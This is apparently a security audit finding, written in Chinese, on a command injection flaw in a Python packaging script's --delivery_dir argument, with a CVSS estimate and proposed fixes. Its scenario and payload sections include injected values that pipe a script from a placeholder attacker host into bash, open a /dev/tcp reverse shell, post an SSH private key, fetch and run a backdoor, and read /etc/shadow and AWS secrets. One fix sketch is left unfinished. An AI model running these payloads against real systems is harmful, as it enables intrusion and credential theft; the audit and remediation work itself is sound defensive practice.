# VULN-DF-PY-001：命令注入漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-PY-001 |
| **漏洞类型** | 命令注入 (Command Injection) |
| **CWE编号** | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| **严重级别** | Critical |
| **置信度** | 85 |
| **影响模块** | scripts/package |
| **受影响文件** | scripts/package/common/py/packer.py |
| **漏洞位置** | 204-214行, 函数 `exec_pack_cmd` |

### 漏洞描述

`exec_pack_cmd` 函数使用 `subprocess.run(cmd, shell=True)` 执行命令，其中 `cmd` 通过 f-string 格式化字符串拼接：
```python
cmd = f'cd {delivery_dir} && {pack_cmd}'
```

`delivery_dir` 直接来自 CLI 参数 (`--delivery_dir`)，若该参数包含 shell 元字符（如 `;`, `$()`, 反引号等），攻击者可注入任意系统命令。

---

## 攻击场景分析

### 场景1: 构建系统中的恶意输入

在自动化构建流水线中，如果构建配置文件或外部输入被污染：

```bash
# 假设攻击者能控制 --delivery_dir 参数
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/legit_dir; curl http://attacker.com/exfil.sh | bash" \
    --independent_pkg
```

### 场景2: CI/CD 环境下的提权攻击

在 CI/CD 环境中，构建脚本通常以较高权限运行：

```bash
# 通过注入获取敏感文件
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/work; cat /etc/shadow > /tmp/.exfil_shadow; rm -rf /tmp/work" \
    --independent_pkg
```

### 场景3: 反向shell注入

```bash
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/x; bash -i >& /dev/tcp/attacker.com/4444 0>&1; #/tmp/x" \
    --independent_pkg
```

---

## Payload 示例

### Payload 1: 简单命令注入探测

```bash
# PoC: 验证漏洞存在
python scripts/package/package.py \
    --pkg_name test_pkg \
    --delivery_dir "/tmp/test; id > /tmp/poc_result" \
    --independent_pkg

# 检查结果
cat /tmp/poc_result
# 输出应显示执行 id 命令的结果，证明命令注入成功
```

### Payload 2: 数据外泄

```bash
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/d; curl -X POST -d @/home/user/.ssh/id_rsa http://attacker.com/capture; #/tmp/d" \
    --independent_pkg
```

### Payload 3: 远程代码执行

```bash
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/x; wget http://malware.example.com/backdoor.py -O /tmp/bd.py; python3 /tmp/bd.py; rm /tmp/bd.py; #/tmp/x" \
    --independent_pkg
```

### Payload 4: 使用 $() 命令替换

```bash
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/$(whoami)_dir" \
    --independent_pkg

# 执行的命令变为: cd /tmp/$(whoami)_dir && pack_cmd
# $(whoami) 会被展开执行
```

### Payload 5: 环境变量利用

```bash
# 假设环境中存在敏感变量
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/x; echo $AWS_SECRET_KEY > /tmp/.keys; #/tmp/x" \
    --independent_pkg
```

---

## 影响评估

### 直接影响

1. **任意命令执行**: 攻击者可在目标系统上执行任意 shell 命令
2. **数据泄露**: 可读取系统上的任意文件，包括密钥、配置、源代码等
3. **系统破坏**: 可删除文件、修改系统配置
4. **权限提升**: 在 CI/CD 环境中可能以构建服务账户权限执行，获得更高权限

### 间接影响

1. **供应链攻击**: 若构建产物被分发，恶意代码可能植入最终产品
2. **横向移动**: 在内网环境中可作为入口点进行横向渗透
3. **持久化**: 可植入后门程序实现持久化控制

### CVSS 3.1 评分估算

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector | Local | 需要本地执行脚本 |
| Attack Complexity | Low | 无需特殊条件 |
| Privileges Required | Low | 需能调用打包脚本 |
| User Interaction | None | 无需交互 |
| Scope | Changed | 可影响其他组件 |
| CIA Impact | High | 完整性、可用性、机密性全高 |

**估算评分**: 8.8 (High)

---

## 修复建议

### 方案1: 移除 shell=True (推荐)

使用列表形式传递命令参数，避免 shell 解析：

```python
def exec_pack_cmd(delivery_dir: str,
                  pack_cmd: str,
                  package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # 将命令拆分为列表形式，避免 shell=True
        # 注意：这需要重构 pack_cmd 的构造方式
        # 因为 compose_makeself_command 返回的是字符串
        
        # 方案：使用 subprocess 直接执行
        # 首先切换目录
        import shlex
        
        # 安全执行：先切换目录，再执行打包命令
        # 需要重构 compose_makeself_command 返回命令列表而非字符串
        pass  # 需要更大范围重构
    
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)
    ...
```

### 方案2: 输入验证与路径规范化

添加严格的输入验证：

```python
import os
import re

def validate_delivery_dir(delivery_dir: str) -> str:
    """验证并规范化 delivery_dir 路径"""
    if not delivery_dir:
        return ""
    
    # 检查是否包含 shell 元字符
    dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r']
    for char in dangerous_chars:
        if char in delivery_dir:
            raise ValueError(f"Invalid character '{char}' in delivery_dir")
    
    # 检查是否为合法路径
    abs_path = os.path.abspath(delivery_dir)
    if not os.path.isdir(abs_path):
        raise ValueError(f"delivery_dir does not exist or is not a directory: {abs_path}")
    
    # 返回规范化路径
    return abs_path

def exec_pack_cmd(delivery_dir: str,
                  pack_cmd: str,
                  package_name: str) -> str:
    """执行打包命令"""
    # 验证 delivery_dir
    delivery_dir = validate_delivery_dir(delivery_dir)
    
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    
    CommLog.cilog_info("package cmd:%s", cmd)
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)
    ...
```

### 方案3: 使用 shlex.quote 进行参数转义

```python
import shlex

def exec_pack_cmd(delivery_dir: str,
                  pack_cmd: str,
                  package_name: str) -> str:
    """执行打包命令"""
    if delivery_dir:
        # 使用 shlex.quote 对路径进行安全转义
        safe_delivery_dir = shlex.quote(delivery_dir)
        cmd = f'cd {safe_delivery_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    
    CommLog.cilog_info("package cmd:%s", cmd)
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)
    ...
```

### 方案4: 完整重构 (最佳方案)

将 `compose_makeself_command` 改为返回命令列表，避免所有 shell=True：

```python
def compose_makeself_command(params: MakeselfPkgParams) -> List[str]:
    """组装 makeself 包打包命令，返回命令列表"""
    
    def get_cleanup_commands() -> List[str]:
        if params.cleanup:
            return ['--cleanup', params.cleanup]
        return []
    
    independent_pkg = params.independent_pkg
    compress_tool = get_compress_tool()
    tar_format = get_compress_format()
    
    if independent_pkg:
        commands = [
            params.makeself_tool, "--header", params.makeself_header,
            "--help-header", params.help_info, compress_tool, '--complevel', '4',
            '--nomd5', '--sha256', '--nooverwrite', '--chown', '--tar-format', tar_format,
            '--tar-extra', '--numeric-owner', '--tar-quietly'
        ]
        commands.extend(get_cleanup_commands())
        commands.extend([params.source_target, params.package_name, params.comments, params.install_script])
    else:
        commands = [
            compress_tool, '--complevel', '4',
            '--nomd5', '--sha256', '--nooverwrite', '--chown', '--tar-format', tar_format,
            '--tar-extra', '--numeric-owner', '--tar-quietly'
        ]
        commands.extend(get_cleanup_commands())
        commands.extend([params.package_name, params.comments])
    
    return commands


def exec_pack_cmd(delivery_dir: str,
                  pack_cmd_list: List[str],
                  package_name: str) -> str:
    """执行打包命令"""
    result = subprocess.run(
        pack_cmd_list,
        cwd=delivery_dir,  # 使用 cwd 参数而非 cd 命令
        check=False,
        stdout=PIPE,
        stderr=STDOUT
    )
    output = result.stdout.decode()
    if result.returncode != 0:
        CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
        raise CompressError(package_name)
    return package_name
```

---

## 参考链接

1. **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
2. **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
3. **Python subprocess 安全最佳实践**: https://docs.python.org/3/library/subprocess.html#security-considerations
4. **shlex.quote 文档**: https://docs.python.org/3/library/shlex.html#shlex.quote
5. **CWE-78 OS Command Injection**: https://cwe.mitre.org/data/definitions/78.html

---

## 数据流追踪

```
package.py:args_parse() [SOURCE]
    ↓ --delivery_dir 参数 (line 777-778)
package.py:main() (line 673-674)
    ↓ delivery_dir = main_args.delivery_dir
package.py:execute_repack_process() (line 437)
    ↓ get_compress_cmd(pkg_args.pkg_output_dir, ...)
package.py:get_compress_cmd() (line 53-71)
    ↓ exec_pack_cmd(delivery_dir, pack_cmd, ...)
packer.py:exec_pack_cmd() [SINK]
    ↓ cmd = f'cd {delivery_dir} && {pack_cmd}'
    ↓ subprocess.run(cmd, shell=True) (line 213)
```

---

## 结论

该漏洞为真实的命令注入漏洞，攻击者可通过控制 `--delivery_dir` CLI 参数注入任意 shell 命令。建议立即采用方案3或方案4进行修复，优先使用 `shlex.quote` 进行参数转义或重构为列表形式执行命令。